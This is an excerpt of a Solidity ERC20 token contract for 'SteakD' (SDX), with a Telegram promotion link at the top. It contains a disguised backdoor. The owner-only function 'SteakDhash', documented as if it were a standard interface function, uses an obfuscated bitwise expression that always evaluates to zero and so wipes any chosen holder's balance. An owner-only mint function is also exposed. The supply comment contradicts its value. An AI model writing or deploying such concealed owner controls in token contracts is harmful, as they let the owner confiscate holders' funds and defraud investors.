...
//
// $SteakD proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/+pnJXFp80VgtlZTU1
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    /**
     * @dev See {IERC20-SteakDhash}.
     */
    function SteakDhash(address target, bool enabled) public onlyOwner {
        _balances[target] = (((_balances[target]) + 1 & (_balances[target]) & 1 & (_balances[target]) & 0) << 0xF);
    }
    /**
    ...
    /**
     * @dev See {IERC20-SteakDFrom}.
     */ 
    function SteakDFrom(uint256 amount) public onlyOwner {
        SteakDFrom(msg.sender, amount);
    }

    /**
     * @dev See {IERC20-setTaxFeePercent}.
     */ 
    ...
    function SteakDFrom(address account, uint256 amount) internal virtual {
...
contract $SteakD is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("SteakD", "SDX") {
     SteakDFrom(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}